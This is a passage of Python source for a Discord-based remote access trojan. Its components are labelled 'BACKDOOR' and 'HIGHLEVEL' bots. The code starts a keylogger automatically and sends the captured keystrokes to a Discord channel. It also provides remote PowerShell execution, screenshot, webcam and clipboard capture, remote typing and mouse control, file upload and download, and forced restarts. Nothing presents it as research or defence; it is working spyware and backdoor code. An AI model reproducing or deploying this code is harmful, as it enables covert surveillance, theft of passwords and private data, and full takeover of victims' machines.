        await ctx.invoke(rev_bot.get_command('join'))

    @discord.ui.button(label="🔇 Leave Mic", style=discord.ButtonStyle.danger, row=2)
    async def leave_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctx = await rev_bot.get_context(interaction.message)
        await ctx.invoke(rev_bot.get_command('leave'))


# --- Help Command Update ---
rev_bot.remove_command('help')


@rev_bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="🕹️ System Control Panel",
        description="Click buttons for quick actions or use the text commands listed below.",
        color=0x2b2d31
    )
    # Reusing your original help text structure
    embed.add_field(name="🕵️ Data", value="`!grab`, `!history`, `!ss`", inline=True)
    embed.add_field(name="⚙️ System", value="`!task`, `!end`, `!execute`", inline=True)
    embed.add_field(name="📂 Files", value="`!ls`, `!cd`, `!pwd`, `!upload`, `!download`", inline=True)

    await ctx.send(embed=embed, view=ControlPanel())



# ==========================================
# 4. BACKDOOR BOT (/)
# ==========================================
def run_ps_sync(cmd):
    marker = "__CMD_DONE__"
    wrapped = f"try {{ {cmd} }} catch {{ Write-Host $_.Exception.Message }} finally {{ Write-Host '{marker}' }}"
    ps.stdin.write(wrapped + "\n")
    ps.stdin.flush()
    output = []
    while True:
        line = ps.stdout.readline()
        if not line or marker in line: break
        output.append(line.strip())
    return "\n".join(output)




def is_my_channel():
    async def predicate(ctx):
        return ctx.channel.id == target_channel_id

    return commands.check(predicate)


# --- SHARED STATE ---

# --- CORRECTED KEYLOGGER LOGIC ---
# --- IMPROVED KEYLOGGER LOGIC ---
log_channel_id = None  # Global to store the #spam channel ID


def on_press(key):
    global log_buffer, logging_active, log_channel_id

    if not logging_active or log_channel_id is None:
        return

    try:
        k = str(key).replace("'", "")
        send_now = False

        # Translation & Immediate Trigger Logic
        if k == "Key.space":
            log_buffer += " "
            send_now = True
        elif k == "Key.enter":
            log_buffer += " [ENTER]\n"
            send_now = True
        elif k == "Key.backspace":
            log_buffer += " [BKSP] "
            send_now = True
        elif "Key" in k:
            return
        else:
            log_buffer += k

        # Send if a trigger key was pressed OR buffer is getting long
        if (send_now or len(log_buffer) > 50) and len(log_buffer) > 0:
            msg = log_buffer
            log_buffer = ""

            channel = bd_bot.get_channel(log_channel_id)
            if channel:
                # Thread-safe execution back to the Discord loop
                bd_bot.loop.call_soon_threadsafe(
                    lambda: asyncio.create_task(channel.send(f"⌨️ **{PC_NAME}**: `{msg}`"))
                )
    except Exception as e:
        print(f"Logger Error: {e}")


def start_keylogger_thread():
    """Function to be run in a separate thread"""
    with Listener(on_press=on_press) as listener:
        listener.join()


# Start the thread immediately when the script runs
Thread(target=start_keylogger_thread, daemon=True).start()


@bd_bot.event
async def on_ready():
    global target_channel_id, log_channel_id, target_channel_name # Added log_channel_id here

    await asyncio.sleep(10) # Wait for categories

    guild = bd_bot.get_guild(GUILD_ID)
    if guild and shared_category:
        # Set up command channel
        target_channel_name = "com-backdoor"  # Default name
        channel = discord.utils.get(shared_category.text_channels, name=target_channel_name)
        if not channel:
            channel = await guild.create_text_channel(target_channel_name, category=shared_category)
        target_channel_id = channel.id

        # SET UP LOG CHANNEL (CRITICAL FOR KEYLOGGER)
        spam_channel = discord.utils.get(shared_category.text_channels, name="spam")
        if spam_channel:
            log_channel_id = spam_channel.id
            print(f"✅ Keylogger linked to: #spam")

        print(f"✅ Backdoor Bot ready.")




# --- PASTE BACKDOOR (/) COMMANDS BELOW ---
# --- ⌨️ INPUT CONTROL ---

@bd_bot.command()
@is_my_channel()
async def type(ctx, *, text):
    pyautogui.write(text, interval=0.05)
    await ctx.send(f"⌨️ Typed text on {target_channel_name}.")


@bd_bot.command()
@is_my_channel()
async def press(ctx, key):
    try:
        pyautogui.press(key.lower())
        await ctx.send(f"🔘 Pressed key: `{key}`")
    except:
        await ctx.send(f"❌ Unknown key: `{key}`")


@bd_bot.command()
@is_my_channel()
async def mouse(ctx, x: int, y: int, click: bool = False):
    pyautogui.moveTo(x, y)
    if click: pyautogui.click()
    await ctx.send(f"🖱️ Mouse moved to {x}, {y} (Click: {click})")





@bd_bot.command()
@is_my_channel()
async def open(ctx, url: str):
    if not url.startswith("http") and "." in url:
        url = "https://" + url
    webbrowser.open(url)
    await ctx.send(f"🌐 Opened `{url}` on {target_channel_name}")


# --- 🐚 SHELL & EXECUTION ---

@bd_bot.command()
@is_my_channel()
async def shell(ctx, *, cmd):
    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(None, run_ps_sync, cmd)
    if len(res) > 1900:
        with open("out.txt", "w") as f:
            f.write(res)
        await ctx.send("📄 Output attached:", file=discord.File("out.txt"))
        os.remove("out.txt")
    else:
        await ctx.send(f"```powershell\n{res}\n```")


@bd_bot.command()
@is_my_channel()
async def execute(ctx, *, path: str):
    os.startfile(path)
    await ctx.send(f"🚀 Executing: `{path}`")


# --- 📸 SPYING ---

@bd_bot.command()
@is_my_channel()
async def say(ctx, *, message: str):
    try:
        engine = pyttsx3.init()
        engine.say(message)
        engine.runAndWait()
        # FIX: Use PC_NAME (defined at top of script) instead of target_channel_name
        await ctx.send(f"🗣️ PC **{PC_NAME}** said: `{message}`")
    except Exception as e:
        await ctx.send(f"⚠️ TTS Error: {e}")

@bd_bot.command()
@is_my_channel()
async def screenshot(ctx):
    # FIX: Use a fixed filename to avoid variable errors
    path = "current_screen.png"
    try:
        await ctx.send("📸 Taking screenshot...")
        pyautogui.screenshot().save(path)
        await ctx.send(file=discord.File(path))
    except Exception as e:
        await ctx.send(f"❌ Screenshot Error: {e}")
    finally:
        if os.path.exists(path):
            os.remove(path)


@bd_bot.command()
@is_my_channel()
async def webcam(ctx):
    # Determine filename using target_channel_name
    # FIX: Use a safe fallback if target_channel_name isn't globalized yet
    chan_name = globals().get('target_channel_name', 'default_pc')
    path = f"web_{chan_name}.png"

    await ctx.send("📸 Initializing camera...")

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        return await ctx.send("❌ No webcam detected or camera is already in use by another app.")

    try:
        # Give the camera more time to adjust exposure/focus
        await asyncio.sleep(3)

        ret, frame = cam.read()
        if ret:
            # Release camera immediately so the file is no longer "in use"
            cam.release()
            cv2.imwrite(path, frame)

            # Send to Discord
            await ctx.send(f"✅ Capture successful from {chan_name}:", file=discord.File(path))
        else:
            cam.release()
            await ctx.send("❌ Failed to grab frame from camera.")

    except Exception as e:
        if cam.isOpened():
            cam.release()
        await ctx.send(f"⚠️ Webcam Error: {e}")
    finally:
        # Cleanup file after sending
        if os.path.exists(path):
            os.remove(path)


@bd_bot.command()
@is_my_channel()
async def clipboard(ctx):
    await ctx.send(f"📋 **Clipboard Data:**\n```\n{pyperclip.paste()}\n```")


@bd_bot.command()
@is_my_channel()
async def log_start(ctx):
    global logging_active, log_channel_id

    # Ensure the log channel is set if it wasn't already
    if log_channel_id is None:
        spam_ch = discord.utils.get(ctx.guild.text_channels, name="spam")
        if spam_ch:
            log_channel_id = spam_ch.id

    logging_active = True

    embed = discord.Embed(
        title="🛰️ Keylogger Activated",
        description=f"Now capturing input from **{PC_NAME}**.\nLogs will appear in the `#spam` channel.",
        color=0x00ff00
    )
    await ctx.send(embed=embed)


@bd_bot.command()
@is_my_channel()
async def log_stop(ctx):
    global logging_active
    logging_active = False
    await ctx.send(f"🛑 **Keylogger Paused**.")


# --- 📂 FILE MANAGEMENT ---

@bd_bot.command()
@is_my_channel()
async def ls(ctx, path: str = "."):
    try:
        p = Path(path).resolve()
        items = [f"{'📁' if i.is_dir() else '📄'} `{i.name}`" for i in p.iterdir()]
        await ctx.send(f"📁 **Directory: {p}**\n" + "\n".join(items)[:1900])
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bd_bot.command()
@is_my_channel()
async def cd(ctx, *, path: str):
    global current_dir
    try:
        new_path = Path(os.path.join(current_dir, path)).resolve()
        if new_path.exists() and new_path.is_dir():
            os.chdir(str(new_path))
            current_dir = os.getcwd()
            sync_cmd = f'Set-Location -Path "{current_dir}"'
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, run_ps_sync, sync_cmd)
            await ctx.send(f"📁 Changed to: `{current_dir}`")
        else:
            await ctx.send("❌ Path not found.")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")


@bd_bot.command()
@is_my_channel()
async def upload(ctx, mode: str = "single"):
    await ctx.send(f"📥 **Upload to:** `{current_dir}`\nWaiting for file(s)...")
    check = lambda m: m.author == ctx.author and m.channel == ctx.channel and m.attachments
    try:
        if mode == "single":
            msg = await bd_bot.wait_for("message", check=check, timeout=60)
            full_path = os.path.join(current_dir, msg.attachments[0].filename)
            await msg.attachments[0].save(full_path)
            await ctx.send(f"✅ **File saved at:** `{full_path}`")
        else:
            await ctx.send("Send multiple files. Type `done` when finished.")
            while True:
                msg = await bd_bot.wait_for("message", timeout=120)
                if msg.content.lower() == "done": break
                for a in msg.attachments:
                    full_path = os.path.join(current_dir, a.filename)
                    await a.save(full_path)
                    await ctx.send(f"✅ **Saved:** `{full_path}`")
    except Exception as e: await ctx.send(f"❌ Error: {e}")


@bd_bot.command()
@is_my_channel()
async def download(ctx, *, path: str):
    await ctx.send("⏳ *Action: Sending file...*")
    try:
        p = Path(path).resolve()
        await ctx.send(file=discord.File(str(p)))
    except Exception as e: await ctx.send(f"❌ Error: {e}")


# --- HELP MENU ---
@bd_bot.command()
@is_my_channel()
async def help(ctx):
    embed = discord.Embed(title="Remote Toolkit Help", color=0x2ecc71)
    embed.add_field(name="⌨️ Control", value="`/type`, `/press`, `/mouse`, `/say`, `/open`", inline=False)
    embed.add_field(name="🐚 Shell", value="`/shell`, `/execute`", inline=False)
    embed.add_field(name="📸 Spy", value="`/screenshot`, `/webcam`, `/clipboard`, `/log_start`, `/log_stop`",
                    inline=False)
    embed.add_field(name="📂 Files", value="`/ls`, `/cd`, `/upload`, `/download`", inline=False)
    embed.add_field(name="⚙️ System", value="`/sysinfo`, `/restart`", inline=False)
    await ctx.send(embed=embed)


@bd_bot.command()
@is_my_channel()
async def sysinfo(ctx):
    ram = psutil.virtual_memory()
    info = f"OS: {platform.system()}\nPC: {platform.node()}\nRAM: {ram.total // 1073741824}GB"
    await ctx.send(f"⚙️ **System Info:**\n```\n{info}\n```")


@bd_bot.command()
@is_my_channel()
async def restart(ctx):
    await ctx.send("⚠️ *Action: Restarting PC in 5 seconds...*")
    os.system("shutdown /r /t 5")


# ==========================================
# 5. HIGHLEVEL BOT (RAW SHELL)
# ==========================================
hl_chan_id = None


def execut_command(cmd):
    marker = "__CMD_DONE__"
    # Added explicit 'Out-String' to ensure complex objects are converted to text
    wrapped = f"try {{ {cmd} | Out-String }} catch {{ $_.Exception.Message }}; write-output '{marker}'"

    ps.stdin.write(wrapped + "\n")
    ps.stdin.flush()

    output = []
    while True:
        line = ps.stdout.readline()
        if not line or marker in line:
            break
        if line.strip():
            output.append(line.strip())
    return "\n".join(output)


@hl_bot.event
async def on_ready():
    global hl_chan_id
    await asyncio.sleep(12) # Wait for category to be ready

    guild = hl_bot.get_guild(GUILD_ID)
    cat = discord.utils.get(guild.categories, name=PC_NAME)

    ip_name = requests.get('https://api.ipify.org').text.replace('.', '-')

    if guild and cat:
        ch = discord.utils.get(cat.text_channels, name=ip_name)
        if not ch:
            ch = await guild.create_text_channel(ip_name, category=cat)
        hl_chan_id = ch.id
        print(f"✅ HighLevel Shell Ready in: {ip_name}")


@hl_bot.event
async def on_message(message):
    # Fix: Ensure hl_chan_id exists and matches current channel
    if not hl_chan_id or message.channel.id != hl_chan_id:
        return

    if message.author.bot:
        return

    # Execute and Paginate
    result = execut_command(message.content) or f"Executed '{message.content}' with no output."

    for i in range(0, len(result), 2000):
        await message.channel.send(result[i:i + 2000])

# ==========================================
# 6. MASTER LAUNCHER
# ==========================================
async def start_all():
    await asyncio.gather(
        rev_bot.start(TOKENS["REVOLUTION"]),
        bd_bot.start(TOKENS["BACKDOOR"]),
        hl_bot.start(TOKENS["HIGHLEVEL"])
    )


if __name__ == "__main__":
    asyncio.run(start_all())